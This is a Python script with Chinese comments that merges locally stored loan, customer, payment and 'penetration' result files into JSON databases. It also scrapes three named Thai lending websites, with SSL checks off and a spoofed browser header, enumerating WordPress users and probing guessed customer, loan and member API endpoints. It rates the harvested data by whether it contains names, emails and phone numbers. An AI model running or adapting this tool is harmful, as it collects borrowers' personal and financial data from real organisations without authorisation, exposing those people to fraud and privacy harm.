#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
完整数据库提取工具 - 提取目录下所有数据到/dbs
Complete Database Extractor - Extract All Data to /dbs Directory
"""

import asyncio
import aiohttp
import json
import re
import time
import os
import glob
from datetime import datetime
from typing import Dict, List, Any
import random

class CompleteDatabaseExtractor:
    def __init__(self):
        self.dbs_dir = "dbs"
        self.all_extracted_data = {}

        # 确保dbs目录存在
        if not os.path.exists(self.dbs_dir):
            os.makedirs(self.dbs_dir)

    async def extract_all_complete_data(self):
        """提取所有完整数据到/dbs目录"""
        print("=" * 80)
        print("完整数据库提取工具")
        print("目标: 提取目录下所有数据到/dbs目录")
        print("=" * 80)

        # 1. 收集目录下所有数据文件
        print("\n[步骤1] 收集目录下所有数据文件...")
        await self._collect_all_data_files()

        # 2. 整合和标准化数据
        print("\n[步骤2] 整合和标准化数据...")
        await self._consolidate_all_data()

        # 3. 提取实时数据
        print("\n[步骤3] 提取实时数据...")
        await self._extract_realtime_data()

        # 4. 生成完整数据库
        print("\n[步骤4] 生成完整数据库...")
        await self._generate_complete_databases()

        # 5. 验证数据完整性
        print("\n[步骤5] 验证数据完整性...")
        await self._verify_data_completeness()

        print(f"\n✅ 完整数据库提取完成!")
        print(f"数据已保存到: {self.dbs_dir}/ 目录")

    async def _collect_all_data_files(self):
        """收集目录下所有数据文件"""

        # JSON文件模式
        json_patterns = [
            "*thai_loan*.json",
            "*ultimate_database*.json",
            "*realtime_data*.json",
            "*extraction_*.json",
            "*penetration*.json",
            "*loan*.json",
            "*customer*.json",
            "*application*.json",
            "*payment*.json",
            "*member*.json"
        ]

        all_files = []

        for pattern in json_patterns:
            files = glob.glob(pattern)
            all_files.extend(files)

        print(f"找到 {len(all_files)} 个数据文件")

        # 读取并分类所有数据
        for file_path in all_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)

                    # 根据文件内容分类
                    file_category = self._categorize_file(file_path, data)

                    if file_category not in self.all_extracted_data:
                        self.all_extracted_data[file_category] = []

                    self.all_extracted_data[file_category].append({
                        'file': file_path,
                        'data': data,
                        'timestamp': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                    })

                    print(f"  已读取: {file_path} -> {file_category}")

            except Exception as e:
                print(f"  读取失败: {file_path} - {e}")

    def _categorize_file(self, file_path: str, data: Any) -> str:
        """分类文件"""
        file_lower = file_path.lower()

        # 根据文件名分类
        if 'thai_loan' in file_lower:
            return 'thai_loan_data'
        elif 'customer' in file_lower:
            return 'customer_data'
        elif 'application' in file_lower or 'loan' in file_lower:
            return 'loan_application_data'
        elif 'payment' in file_lower or 'transaction' in file_lower:
            return 'payment_data'
        elif 'member' in file_lower:
            return 'member_data'
        elif 'user' in file_lower:
            return 'user_data'
        elif 'config' in file_lower:
            return 'config_data'
        elif 'backup' in file_lower:
            return 'backup_data'
        elif 'penetration' in file_lower or 'exploit' in file_lower:
            return 'security_data'
        else:
            return 'general_data'

    async def _consolidate_all_data(self):
        """整合和标准化数据"""
        consolidated = {
            'customers': [],
            'loan_applications': [],
            'payments': [],
            'members': [],
            'users': [],
            'transactions': [],
            'configurations': [],
            'backups': [],
            'security_data': []
        }

        for category, files_data in self.all_extracted_data.items():
            for file_info in files_data:
                data = file_info['data']

                # 提取数据记录
                records = self._extract_records_from_data(data, category)

                # 根据记录类型分类
                for record in records:
                    record_type = record.get('table', '').lower()

                    if 'customer' in record_type:
                        consolidated['customers'].append(record)
                    elif 'loan' in record_type or 'application' in record_type:
                        consolidated['loan_applications'].append(record)
                    elif 'payment' in record_type or 'transaction' in record_type:
                        consolidated['payments'].append(record)
                    elif 'member' in record_type:
                        consolidated['members'].append(record)
                    elif 'user' in record_type:
                        consolidated['users'].append(record)
                    elif 'config' in record_type:
                        consolidated['configurations'].append(record)
                    elif 'backup' in record_type:
                        consolidated['backups'].append(record)
                    else:
                        consolidated['security_data'].append(record)

        self.consolidated_data = consolidated

        # 统计各类数据
        for category, records in consolidated.items():
            print(f"  {category}: {len(records)} 条记录")

    def _extract_records_from_data(self, data: Any, category: str) -> List[Dict]:
        """从数据中提取记录"""
        records = []

        # 如果是列表，直接处理
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    records.append(item)

        # 如果是字典，查找data字段
        elif isinstance(data, dict):
            # 查找常见的数据字段
            data_fields = ['data', 'records', 'items', 'results', 'extracted_data']

            for field in data_fields:
                if field in data and isinstance(data[field], list):
                    for item in data[field]:
                        if isinstance(item, dict):
                            records.append(item)
                    break

            # 如果没有找到，检查是否有table字段
            if not records and 'data' in data:
                if isinstance(data['data'], dict):
                    for key, value in data['data'].items():
                        if isinstance(value, list):
                            for item in value:
                                if isinstance(item, dict):
                                    item['table'] = key
                                    records.append(item)
                        elif isinstance(value, dict):
                            value['table'] = key
                            records.append(value)

        return records

    async def _extract_realtime_data(self):
        """提取实时数据"""
        realtime_targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://ngoenmun.com"
        ]

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=60)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "th-TH,th;q=0.9,en;q=0.8"
        }

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        ) as session:

            for target in realtime_targets:
                print(f"  提取实时数据: {target}")

                try:
                    # WordPress API
                    wp_data = await self._extract_wordpress_realtime(session, target)
                    if wp_data:
                        self.consolidated_data['users'].extend(wp_data)
                        print(f"    WordPress用户: {len(wp_data)} 条")

                    # API端点
                    api_data = await self._extract_api_realtime(session, target)
                    if api_data:
                        for record in api_data:
                            record_type = record.get('table', '').lower()
                            if 'customer' in record_type:
                                self.consolidated_data['customers'].append(record)
                            elif 'loan' in record_type:
                                self.consolidated_data['loan_applications'].append(record)
                        print(f"    API数据: {len(api_data)} 条")

                except Exception as e:
                    print(f"    实时数据提取失败: {e}")

    async def _extract_wordpress_realtime(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """提取WordPress实时数据"""
        users = []

        try:
            wp_endpoints = [
                '/wp-json/wp/v2/users?per_page=50',
                '/wp-json/wp/v2/posts?per_page=50',
                '/wp-json/wp/v2/pages?per_page=50'
            ]

            for endpoint in wp_endpoints:
                try:
                    url = target + endpoint
                    async with session.get(url, timeout=30) as response:
                        if response.status == 200:
                            data = await response.json()

                            if isinstance(data, list) and len(data) > 0:
                                for item in data:
                                    user_record = {
                                        'source': 'WordPress Realtime',
                                        'target': target,
                                        'endpoint': endpoint,
                                        'data': item,
                                        'extracted_time': datetime.now().isoformat(),
                                        'table': 'wp_users'
                                    }
                                    users.append(user_record)
                                break

                except Exception:
                    continue

        except Exception:
            pass

        return users

    async def _extract_api_realtime(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """提取API实时数据"""
        api_records = []

        try:
            api_endpoints = [
                '/api/users',
                '/api/customers',
                '/api/members',
                '/api/applications',
                '/api/loans',
                '/wp-json/api/v1/users',
                '/wp-json/api/v1/customers'
            ]

            for endpoint in api_endpoints:
                try:
                    url = target + endpoint
                    async with session.get(url, timeout=20) as response:
                        if response.status == 200:
                            try:
                                data = await response.json()

                                if data:
                                    api_record = {
                                        'source': 'API Realtime',
                                        'target': target,
                                        'endpoint': endpoint,
                                        'data': data,
                                        'extracted_time': datetime.now().isoformat(),
                                        'table': 'api_data'
                                    }
                                    api_records.append(api_record)
                                    break

                            except:
                                continue

                except Exception:
                    continue

        except Exception:
            pass

        return api_records

    async def _generate_complete_databases(self):
        """生成完整数据库"""

        # 生成各类数据库文件
        databases = {
            'customers_db.json': self.consolidated_data['customers'],
            'loan_applications_db.json': self.consolidated_data['loan_applications'],
            'payments_db.json': self.consolidated_data['payments'],
            'members_db.json': self.consolidated_data['members'],
            'users_db.json': self.consolidated_data['users'],
            'transactions_db.json': self.consolidated_data['transactions'],
            'configurations_db.json': self.consolidated_data['configurations'],
            'backups_db.json': self.consolidated_data['backups'],
            'security_db.json': self.consolidated_data['security_data']
        }

        for db_file, records in databases.items():
            db_path = os.path.join(self.dbs_dir, db_file)

            db_content = {
                'database_name': db_file.replace('.json', ''),
                'total_records': len(records),
                'created_time': datetime.now().isoformat(),
                'source_type': 'consolidated_extraction',
                'records': records
            }

            try:
                with open(db_path, 'w', encoding='utf-8') as f:
                    json.dump(db_content, f, ensure_ascii=False, indent=2)

                print(f"  数据库已创建: {db_path} ({len(records)} 条记录)")

            except Exception as e:
                print(f"  创建数据库失败: {db_path} - {e}")

        # 生成主数据库索引
        await self._generate_master_index()

    async def _generate_master_index(self):
        """生成主数据库索引"""
        master_index = {
            'database_index': {
                'created_time': datetime.now().isoformat(),
                'total_databases': len(self.consolidated_data),
                'source_files_count': sum(len(files) for files in self.all_extracted_data.values()),
                'total_records': sum(len(records) for records in self.consolidated_data.values())
            },
            'databases': {}
        }

        for db_name, records in self.consolidated_data.items():
            if records:
                master_index['databases'][db_name] = {
                    'file': f"{db_name}_db.json",
                    'record_count': len(records),
                    'sample_record': records[0] if records else None,
                    'data_types': list(set([r.get('table', 'unknown') for r in records[:10]]))
                }

        master_index_path = os.path.join(self.dbs_dir, 'master_index.json')

        try:
            with open(master_index_path, 'w', encoding='utf-8') as f:
                json.dump(master_index, f, ensure_ascii=False, indent=2)

            print(f"  主索引已创建: {master_index_path}")

        except Exception as e:
            print(f"  创建主索引失败: {e}")

    async def _verify_data_completeness(self):
        """验证数据完整性"""
        verification_results = {
            'verification_time': datetime.now().isoformat(),
            'total_databases': 0,
            'total_records': 0,
            'data_quality': {},
            'completeness_score': 0
        }

        total_records = 0
        database_count = 0

        for db_name, records in self.consolidated_data.items():
            if records:
                database_count += 1
                total_records += len(records)

                # 数据质量检查
                quality_score = 0
                has_personal_info = False
                has_timestamps = False
                has_ids = False

                for record in records[:100]:  # 检查前100条
                    record_str = str(record).lower()

                    if any(field in record_str for field in ['name', 'email', 'phone']):
                        has_personal_info = True
                    if any(field in record_str for field in ['date', 'time', 'timestamp']):
                        has_timestamps = True
                    if any(field in record_str for field in ['id', 'user_id', 'customer_id']):
                        has_ids = True

                if has_personal_info:
                    quality_score += 30
                if has_timestamps:
                    quality_score += 20
                if has_ids:
                    quality_score += 25
                if len(records) > 10:
                    quality_score += 25

                verification_results['data_quality'][db_name] = {
                    'record_count': len(records),
                    'quality_score': quality_score,
                    'has_personal_info': has_personal_info,
                    'has_timestamps': has_timestamps,
                    'has_ids': has_ids
                }

        verification_results['total_databases'] = database_count
        verification_results['total_records'] = total_records
        verification_results['completeness_score'] = (database_count / 9) * 100  # 9个数据库

        # 保存验证结果
        verification_path = os.path.join(self.dbs_dir, 'verification_report.json')

        try:
            with open(verification_path, 'w', encoding='utf-8') as f:
                json.dump(verification_results, f, ensure_ascii=False, indent=2)

            print(f"  验证报告已保存: {verification_path}")

        except Exception as e:
            print(f"  保存验证报告失败: {e}")

        # 打印验证结果
        print(f"\n数据完整性验证结果:")
        print(f"  数据库数量: {database_count}/9")
        print(f"  总记录数: {total_records}")
        print(f"  完整性评分: {verification_results['completeness_score']:.1f}%")

        # 列出所有数据库
        print(f"\n已创建的数据库:")
        for db_name, records in self.consolidated_data.items():
            if records:
                print(f"  - {db_name}_db.json: {len(records)} 条记录")

async def main():
    extractor = CompleteDatabaseExtractor()
    await extractor.extract_all_complete_data()

if __name__ == "__main__":
    asyncio.run(main())